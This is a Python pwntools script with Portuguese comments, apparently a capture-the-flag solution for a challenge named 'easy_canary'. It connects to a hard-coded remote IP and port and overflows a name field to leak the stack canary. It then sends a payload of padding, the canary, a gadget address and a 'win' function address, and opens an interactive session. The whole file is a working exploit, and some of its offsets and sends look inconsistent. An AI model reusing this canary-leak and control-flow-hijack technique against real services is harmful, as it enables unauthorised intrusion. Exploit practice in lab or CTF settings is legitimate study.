from pwn import *

# Configuração do servidor remoto
remote_ip = '100.101.228.35'
remote_port = 5000

# Parâmetros conhecidos
offset = 40  # Ajuste conforme necessário
win_addr = 0x4007cd

# Conectar ao servidor
io = remote(remote_ip, remote_port)
#io = process('./easy_canary')
"""
gdb.attach(io,gdbscript='''
break *menu+58
c
''')
"""
# Passo 1: Enviar entrada para alcançar o canário
io.sendlineafter(b'> ', b'1')  # Escolher "Tell me your name"
io.sendlineafter(b'Name: ', b'A' * offset)  # Enviar preenchimento até o canário

# Passo 2: Usar a funcionalidade para imprimir o canário
io.sendlineafter(b'> ', b'2')  # Escolher "Print your name"

# Passo 3: Ler a saída para vazar o canário
response = io.recvuntil(b'\n### Menu ###')  # Receber até o próximo menu
canary_raw = response.split(b'A' * offset)[1][:8]  # Extrair o canário
canary = u64(canary_raw)  # Converter para inteiro
#  canary-=0xa
log.info(f"Canary: {hex(canary)}")

# Passo 4: Construir o payload
payload = b'A' * 48+p64(canary-0xa)+b"A"*8+p64(0x4008ed)+p64(win_addr)



print(f'Payload: {payload}')
# Passo 5: Enviar o payload
io.send(b'1')  # Escolher "Tell me your name" novamente
io.send(b'Name: ' + payload)

# Modo interativo para verificar o resultado
io.interactive()